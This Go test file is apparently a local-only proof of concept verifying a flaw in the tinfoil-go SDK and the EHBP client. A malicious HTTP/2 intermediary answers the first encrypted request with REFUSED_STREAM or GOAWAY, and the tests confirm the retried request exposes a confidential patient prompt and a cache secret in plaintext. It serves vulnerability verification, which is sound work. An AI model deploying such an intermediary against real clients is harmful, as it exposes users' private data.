package tinfoil

// verify3 independent PoC (LOCAL ONLY, 127.0.0.1).
//
// Differences from the original hunt PoC, to remove test artifacts:
//   - http.DefaultTransport is NOT modified. The intermediary's certificate is
//     trusted only because its CA is in the "system" root store, supplied via
//     SSL_CERT_FILE (the stand-in for a WebPKI certificate). ALPN is whatever
//     the pristine DefaultTransport offers.
//   - The client is built with the shipped createClientFromHandle (what
//     NewClient/NewClientWithOptions call) / NewGateway, on a real
//     *enclave.Handle. Only the attestation fetch+verify step is replaced
//     (enclave.NewHandleWithVerifyForPoC), returning the genuine enclave HPKE key.
//   - Two independent triggers are tested: RST_STREAM(REFUSED_STREAM) and
//     GOAWAY(NO_ERROR, last-stream-id 0), plus an honest-intermediary control.

import (
	"bytes"
	"context"
	"crypto/tls"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/openai/openai-go/v3"
	"github.com/openai/openai-go/v3/option"
	ehbpclient "github.com/tinfoilsh/encrypted-http-body-protocol/client"
	ehbpidentity "github.com/tinfoilsh/encrypted-http-body-protocol/identity"
	"github.com/tinfoilsh/tinfoil-go/document"
	"github.com/tinfoilsh/tinfoil-go/enclave"
	"github.com/tinfoilsh/tinfoil-go/verify"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

const (
	v3Honest = iota
	v3Refuse
	v3GoAway
)

type v3Stream struct {
	conn int
	id   uint32
	hdr  map[string]string
	body bytes.Buffer
}

type v3Intermediary struct {
	t        *testing.T
	mode     int
	upstream string

	mu       sync.Mutex
	conns    int
	alpn     []string
	streams  []*v3Stream
	original *v3Stream // ciphertext the client sent on the attacked stream
}

func (m *v3Intermediary) snapshot() ([]string, []*v3Stream) {
	m.mu.Lock()
	defer m.mu.Unlock()
	return append([]string(nil), m.alpn...), append([]*v3Stream(nil), m.streams...)
}

func (m *v3Intermediary) serve(raw net.Conn) {
	defer raw.Close()
	tc := raw.(*tls.Conn)
	if err := tc.Handshake(); err != nil {
		return
	}
	m.mu.Lock()
	m.conns++
	connNo := m.conns
	m.alpn = append(m.alpn, tc.ConnectionState().NegotiatedProtocol)
	m.mu.Unlock()
	if tc.ConnectionState().NegotiatedProtocol != "h2" {
		return
	}
	preface := make([]byte, len(http2.ClientPreface))
	if _, err := io.ReadFull(tc, preface); err != nil || string(preface) != http2.ClientPreface {
		return
	}
	fr := http2.NewFramer(tc, tc)
	fr.ReadMetaHeaders = hpack.NewDecoder(65536, nil)
	var hb bytes.Buffer
	he := hpack.NewEncoder(&hb)
	if err := fr.WriteSettings(); err != nil {
		return
	}
	open := map[uint32]*v3Stream{}
	for {
		f, err := fr.ReadFrame()
		if err != nil {
			return
		}
		var done *v3Stream
		switch f := f.(type) {
		case *http2.SettingsFrame:
			if !f.IsAck() {
				fr.WriteSettingsAck()
			}
		case *http2.PingFrame:
			if !f.IsAck() {
				fr.WritePing(true, f.Data)
			}
		case *http2.MetaHeadersFrame:
			s := &v3Stream{conn: connNo, id: f.StreamID, hdr: map[string]string{}}
			for _, hf := range f.Fields {
				s.hdr[hf.Name] = hf.Value
			}
			open[f.StreamID] = s
			if f.StreamEnded() {
				done = s
			}
		case *http2.DataFrame:
			s := open[f.StreamID]
			if s == nil {
				continue
			}
			s.body.Write(f.Data())
			if n := uint32(len(f.Data())); n > 0 {
				fr.WriteWindowUpdate(0, n)
				fr.WriteWindowUpdate(f.StreamID, n)
			}
			if f.StreamEnded() {
				done = s
			}
		}
		if done == nil {
			continue
		}
		delete(open, done.id)
		m.mu.Lock()
		m.streams = append(m.streams, done)
		attackNow := m.mode != v3Honest && m.original == nil && done.body.Len() > 0
		if attackNow {
			m.original = done
		}
		replay := m.original
		m.mu.Unlock()

		if attackNow {
			// Refuse the stream only after the complete ciphertext arrived.
			if m.mode == v3Refuse {
				fr.WriteRSTStream(done.id, http2.ErrCodeRefusedStream)
			} else {
				fr.WriteGoAway(0, http2.ErrCodeNo, nil)
			}
			continue
		}

		// Forward to the genuine enclave. A malicious intermediary replays the
		// ORIGINAL ciphertext and key; an honest one forwards what it got.
		fwd := done
		if replay != nil {
			fwd = replay
		}
		up, _ := http.NewRequest(done.hdr[":method"], m.upstream+done.hdr[":path"], bytes.NewReader(fwd.body.Bytes()))
		for _, h := range []string{"content-type", "authorization", "ehbp-encapsulated-key", "x-tinfoil-enclave-url", "x-tinfoil-seal"} {
			if v, ok := fwd.hdr[h]; ok {
				up.Header.Set(h, v)
			}
		}
		upResp, err := (&http.Client{Transport: &http.Transport{}}).Do(up)
		if err != nil {
			m.t.Errorf("upstream: %v", err)
			return
		}
		upBody, _ := io.ReadAll(upResp.Body)
		upResp.Body.Close()
		hb.Reset()
		he.WriteField(hpack.HeaderField{Name: ":status", Value: strconv.Itoa(upResp.StatusCode)})
		if ct := upResp.Header.Get("Content-Type"); ct != "" {
			he.WriteField(hpack.HeaderField{Name: "content-type", Value: ct})
		}
		if n := upResp.Header.Get("Ehbp-Response-Nonce"); n != "" {
			he.WriteField(hpack.HeaderField{Name: "ehbp-response-nonce", Value: n})
		}
		fr.WriteHeaders(http2.HeadersFrameParam{StreamID: done.id, BlockFragment: hb.Bytes(), EndHeaders: true, EndStream: len(upBody) == 0})
		for len(upBody) > 0 {
			n := min(len(upBody), 16384)
			fr.WriteData(done.id, n == len(upBody), upBody[:n])
			upBody = upBody[n:]
		}
	}
}


type v3Enclave struct {
	id   *ehbpidentity.Identity
	srv  *httptest.Server
	mu   sync.Mutex
	seen []string
}

func newV3Enclave(t *testing.T) *v3Enclave {
	id, err := ehbpidentity.NewIdentity()
	if err != nil {
		t.Fatal(err)
	}
	e := &v3Enclave{id: id}
	e.srv = httptest.NewServer(id.Middleware()(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		e.mu.Lock()
		e.seen = append(e.seen, string(b))
		e.mu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"id":"c1","object":"chat.completion","created":1,"model":"m","choices":[{"index":0,"finish_reason":"stop","message":{"role":"assistant","content":"reply-from-genuine-enclave"}}]}`))
	})))
	t.Cleanup(e.srv.Close)
	return e
}

func (e *v3Enclave) verification() func() (*verify.Verification, error) {
	return func() (*verify.Verification, error) {
		return &verify.Verification{
			CryptoMaterial: []document.CryptoMaterialItem{{
				ID: document.CryptoMaterialIDHPKE, Format: document.KeyX25519HPKEV1Format, Data: e.id.MarshalPublicKeyHex(),
			}},
			FreshnessExpiresAt: time.Now().Add(time.Hour),
		}, nil
	}
}

func startV3Intermediary(t *testing.T, mode int, upstream string) (*v3Intermediary, string) {
	certFile, keyFile := os.Getenv("POC_LEAF_CERT"), os.Getenv("POC_LEAF_KEY")
	if certFile == "" || os.Getenv("SSL_CERT_FILE") == "" {
		t.Skip("run with SSL_CERT_FILE=<ca.pem> POC_LEAF_CERT=<leaf.pem> POC_LEAF_KEY=<leaf.key>")
	}
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		t.Fatal(err)
	}
	// The intermediary is willing to speak either protocol; Go's TLS server
	// picks by server preference among what the client offers.
	ln, err := tls.Listen("tcp", "127.0.0.1:0", &tls.Config{Certificates: []tls.Certificate{cert}, NextProtos: []string{"h2", "http/1.1"}})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { ln.Close() })
	m := &v3Intermediary{t: t, mode: mode, upstream: upstream}
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			go m.serve(c)
		}
	}()
	return m, ln.Addr().String()
}

const (
	v3Prompt = "CONFIDENTIAL-PROMPT: patient Jane Roe, diagnosis 4471"
	v3Secret = "victim-user-cache-secret-91c2"
)

func v3Report(t *testing.T, name string, m *v3Intermediary, e *v3Enclave, wantLeak bool) {
	alpn, streams := m.snapshot()
	t.Logf("[%s] intermediary TLS connections=%d negotiated ALPN=%v", name, len(alpn), alpn)
	leaked := false
	for i, s := range streams {
		b := s.body.String()
		show := b
		if len(show) > 150 {
			show = show[:150] + "..."
		}
		k := s.hdr["ehbp-encapsulated-key"]
		if len(k) > 16 {
			k = k[:16] + ".."
		}
		t.Logf("[%s] stream#%d conn=%d id=%d %s %s ehbp-encapsulated-key=%s x-stainless-retry-count=%s body(%dB)=%q",
			name, i, s.conn, s.id, s.hdr[":method"], s.hdr[":path"], k, s.hdr["x-stainless-retry-count"], s.body.Len(), show)
		if strings.Contains(b, "patient Jane Roe") {
			leaked = true
		}
	}
	e.mu.Lock()
	t.Logf("[%s] genuine enclave handled %d request(s); decrypted: %q", name, len(e.seen), e.seen)
	e.mu.Unlock()
	for _, p := range alpn {
		if p != "h2" {
			t.Errorf("[%s] expected pristine DefaultTransport to negotiate h2, got %q", name, p)
		}
	}
	if leaked != wantLeak {
		t.Fatalf("[%s] plaintext visible to intermediary = %v, want %v", name, leaked, wantLeak)
	}
	if leaked {
		t.Logf("[%s] RESULT: intermediary read the plaintext body; the SDK call still succeeded", name)
	} else {
		t.Logf("[%s] RESULT: intermediary saw only ciphertext", name)
	}
}

// Default NewClient / NewClientWithOptions composition (direct mode): the
// attacker terminates TLS for the enclave hostname itself.
func testV3Direct(t *testing.T, name string, mode int, wantLeak bool) {
	e := newV3Enclave(t)
	m, addr := startV3Intermediary(t, mode, e.srv.URL)
	handle := enclave.NewHandleWithVerifyForPoC(addr, defaultConfigRepo, e.verification())
	c, err := createClientFromHandle(handle, TransportEHBP, "", v3Secret, option.WithAPIKey("tk_victim_api_key"))
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer cancel()
	resp, err := c.Chat.Completions.New(ctx, openai.ChatCompletionNewParams{
		Model:    "m",
		Messages: []openai.ChatCompletionMessageParamUnion{openai.UserMessage(v3Prompt)},
	})
	if err != nil {
		t.Fatalf("[%s] SDK call failed: %v", name, err)
	}
	t.Logf("[%s] SDK call OK, assistant=%q", name, resp.Choices[0].Message.Content)
	v3Report(t, name, m, e, wantLeak)
	_, streams := m.snapshot()
	for _, s := range streams {
		if strings.Contains(s.body.String(), "patient Jane Roe") && !strings.Contains(s.body.String(), v3Secret) {
			t.Errorf("[%s] expected injected user_cache_secret in leaked body", name)
		}
	}
}

func TestPoCVerify3_Direct_Honest(t *testing.T)   { testV3Direct(t, "direct/honest", v3Honest, false) }
func TestPoCVerify3_Direct_RefusedStream(t *testing.T) {
	testV3Direct(t, "direct/REFUSED_STREAM", v3Refuse, true)
}
func TestPoCVerify3_Direct_GoAway(t *testing.T) { testV3Direct(t, "direct/GOAWAY", v3GoAway, true) }

// WithBaseURL proxy composition: proxy origin differs from the enclave.
func TestPoCVerify3_WithBaseURLProxy_RefusedStream(t *testing.T) {
	e := newV3Enclave(t)
	m, addr := startV3Intermediary(t, v3Refuse, e.srv.URL)
	handle := enclave.NewHandleWithVerifyForPoC("enclave.example", defaultConfigRepo, e.verification())
	c, err := createClientFromHandle(handle, TransportEHBP, "https://"+addr+"/v1/", v3Secret, option.WithAPIKey("tk_victim_api_key"))
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer cancel()
	resp, err := c.Chat.Completions.New(ctx, openai.ChatCompletionNewParams{
		Model:    "m",
		Messages: []openai.ChatCompletionMessageParamUnion{openai.UserMessage(v3Prompt)},
	})
	if err != nil {
		t.Fatalf("SDK call failed: %v", err)
	}
	t.Logf("[proxy] SDK call OK, assistant=%q", resp.Choices[0].Message.Content)
	v3Report(t, "proxy/REFUSED_STREAM", m, e, true)
}

// NewGateway as shipped; only the replica attestation inside seal.build is
// swapped for the PoC handle (the shipped closure would fetch attestation
// through the relay over the network).
func TestPoCVerify3_Gateway_GoAway(t *testing.T) {
	e := newV3Enclave(t)
	m, addr := startV3Intermediary(t, v3GoAway, e.srv.URL)
	gatewayURL := "https://" + addr + "/v1/"
	g, err := NewGateway(gatewayURL, func() Catalog {
		return Catalog{"m": {Repo: "tinfoilsh/confidential-model-x", Hosts: []string{"replica.example"}}}
	}, GatewayOptions{ClientOptions: []ClientOption{
		WithUserCacheSecret(v3Secret),
		WithOpenAIOptions(option.WithAPIKey("tk_victim_api_key")),
	}})
	if err != nil {
		t.Fatal(err)
	}
	g.seal.build = func(r replica) (http.RoundTripper, error) {
		secure := enclave.NewHandleWithVerifyForPoC(r.host, r.ref, e.verification())
		httpClient, err := ehbpHTTPClient(secure, r.host, gatewayURL)
		if err != nil {
			return nil, err
		}
		return &verifiedReplicaTransport{
			recoveryTransport: &recoveryTransport{transport: httpClient.Transport},
			verification:      secure.Verification,
		}, nil
	}
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer cancel()
	resp, err := g.Chat.Completions.New(ctx, openai.ChatCompletionNewParams{
		Model:    "m",
		Messages: []openai.ChatCompletionMessageParamUnion{openai.UserMessage(v3Prompt)},
	})
	if err != nil {
		t.Fatalf("gateway SDK call failed: %v", err)
	}
	t.Logf("[gateway] SDK call OK, assistant=%q", resp.Choices[0].Message.Content)
	v3Report(t, "gateway/GOAWAY", m, e, true)
}

// Bare EHBP v0.3.2 client library, README-style usage: http.NewRequest with a
// strings/bytes body (net/http sets GetBody automatically).
func TestPoCVerify3_EHBPLibrary_RefusedStream(t *testing.T) {
	e := newV3Enclave(t)
	m, addr := startV3Intermediary(t, v3Refuse, e.srv.URL)
	tr, err := ehbpclient.NewTransportWithIdentity(e.id)
	if err != nil {
		t.Fatal(err)
	}
	req, _ := http.NewRequest(http.MethodPost, "https://"+addr+"/v1/chat/completions",
		strings.NewReader(`{"model":"m","messages":[{"role":"user","content":"`+v3Prompt+`"}]}`))
	req.Header.Set("Content-Type", "application/json")
	t.Logf("[lib] http.NewRequest set GetBody automatically: %v", req.GetBody != nil)
	resp, err := (&http.Client{Transport: tr}).Do(req)
	if err != nil {
		t.Fatal(err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	t.Logf("[lib] client got %s %s body=%q", resp.Proto, resp.Status, body)
	v3Report(t, "lib/REFUSED_STREAM", m, e, true)
}
